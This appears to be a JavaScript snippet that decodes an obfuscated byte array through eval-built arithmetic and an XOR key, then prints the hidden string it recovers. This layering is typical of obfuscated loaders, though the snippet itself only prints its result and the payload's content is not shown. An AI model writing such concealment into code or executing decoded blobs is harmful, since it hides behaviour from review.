var a = function lq(VA) {
    var qo, mo = "", no = "", oo = [0x8c, 0xcd, 0x4c, 0xf9, 0xd7, 0x4d, 0x25, 0xba, 0x3c, 0x16, 0x96, 0x44, 0x8d, 0x0b, 0x90, 0x1e, 0xa3, 0x39, 0xc9, 0x86, 0x23, 0x61, 0x2f, 0xc8, 0x30, 0xdd, 0x57, 0xec, 0x92, 0x84, 0xc4, 0x6a, 0xeb, 0x99, 0x37, 0xeb, 0x25, 0x0e, 0xbb, 0xb0, 0x95, 0x76, 0x45, 0xde, 0x80, 0x59, 0xf6, 0x9c, 0x58, 0x39, 0x12, 0xc7, 0x9c, 0x8d, 0x18, 0xe0, 0xc5, 0x77, 0x50, 0x39, 0x01, 0xed, 0x93, 0x39, 0x02, 0x7e, 0x72, 0x4f, 0x24, 0x01, 0xe9, 0x66, 0x75, 0x4e, 0x2b, 0xd8, 0x6e, 0xe2, 0xfa, 0xc7, 0xa4, 0x85, 0x4e, 0xc2, 0xa5, 0x96, 0x6b, 0x58, 0x39, 0xd2, 0x7f, 0x44, 0xe5, 0x7b, 0x48, 0x2d, 0xf6, 0xdf, 0xbc, 0x31, 0x1e, 0xf6, 0xbf, 0x84, 0x6d, 0x5e, 0x33, 0x0c, 0x97, 0x5c, 0x39, 0x26, 0xf2, 0x9b, 0x77, 0x0d, 0xd6, 0xc0, 0x46, 0x38, 0x5f, 0xf4, 0xe2, 0x9f, 0xf1, 0x7b, 0xe8, 0xbe, 0x37, 0xdf, 0xd0, 0xbd, 0xb9, 0x36, 0x2c, 0xd1, 0xc3, 0x40, 0xe7, 0xcc, 0xa9, 0x52, 0x3b, 0x20, 0x40, 0x09, 0xe1, 0xd2, 0xa3, 0x80, 0x25, 0x0a, 0xb2, 0xd8, 0xce, 0x21, 0x69, 0x3e, 0xe6, 0x80, 0xfd, 0x73, 0xab, 0x51, 0xde, 0x60, 0x15, 0x95, 0x07, 0x94, 0x6a, 0x18, 0x9d, 0x37, 0x31, 0xde, 0x64, 0xdd, 0x63, 0xe3, 0x57, 0x05, 0x82, 0xff, 0xcc, 0x75, 0x79, 0x63, 0x09, 0xe2, 0x6c, 0x21, 0x5c, 0xe0, 0x7d, 0x4a, 0xf2, 0xd8, 0x9c, 0x22, 0xa3, 0x3d, 0xba, 0xa0, 0xaf, 0x30, 0xc1, 0x47, 0xf4, 0xca, 0xee, 0x64, 0xf9, 0x7b, 0x55, 0xd5, 0xd2, 0x4c, 0xc9, 0x7f, 0x25, 0xfe, 0x48, 0xcd, 0x4b, 0xcc, 0x81, 0x1b, 0x05, 0x82, 0x38, 0x0e, 0x83, 0x19, 0xe3, 0x65, 0x3f, 0xbf, 0x16, 0x88, 0x93, 0xdd, 0x3b];
    qo = "qo=241; do{oo[qo]=(-oo[qo])&0xff; oo[qo]=(((oo[qo]>>3)|((oo[qo]<<5)&0xff))-70)&0xff;} while(--qo>=2);";
    eval(qo);
    qo = 240;
    do {
        oo[qo] = (oo[qo] - oo[qo - 1]) & 0xff;
    } while (--qo >= 3);
    qo = 1;
    for (; ;) {
        if (qo > 240) break;
        oo[qo] = ((((((oo[qo] + 2) & 0xff) + 76) & 0xff) << 1) & 0xff) | (((((oo[qo] + 2) & 0xff) + 76) & 0xff) >> 7);
        qo++;
    }
    po = "";
    for (qo = 1; qo < oo.length - 1; qo++) if (qo % 6) po += String.fromCharCode(oo[qo] ^ VA);
    return po
}

console.log(a(82))